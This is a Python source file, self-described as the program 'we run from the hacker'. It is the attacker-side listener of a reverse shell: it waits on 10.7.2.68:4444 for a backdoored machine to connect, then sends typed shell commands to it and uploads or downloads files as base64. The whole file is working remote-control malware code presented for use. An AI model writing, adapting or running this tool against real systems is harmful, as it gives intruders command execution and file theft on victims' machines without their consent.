#this is the program that we run from the hacker

import socket, json, base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        listener.bind((ip, port))  
        listener.listen(0)
        print("Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_remotly(self,command):
        self.reliable_send(command)
        if command == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode('utf-8') 

            
    def run(self):
        while True:
            command = input(">> ")              
            try:
                if command.startswith("upload"):
                    command = command.split(" ")
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                    
                result = self.execute_remotly(command)
                
                if isinstance(command, str) and command.startswith("download") and "[-] Error " not in result:
                    command_list = command.split(" ")
                    result = self.write_file(command_list[1],result)
            except Exception:
                result = "[-] Error during command execution"
            
            print(result)


my_listener = Listener ("10.7.2.68",4444)
my_listener.run()